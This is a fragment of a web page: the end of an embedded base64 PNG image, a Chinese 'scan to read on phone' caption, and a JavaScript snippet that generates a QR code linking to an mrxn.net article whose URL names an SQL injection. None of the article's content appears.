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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 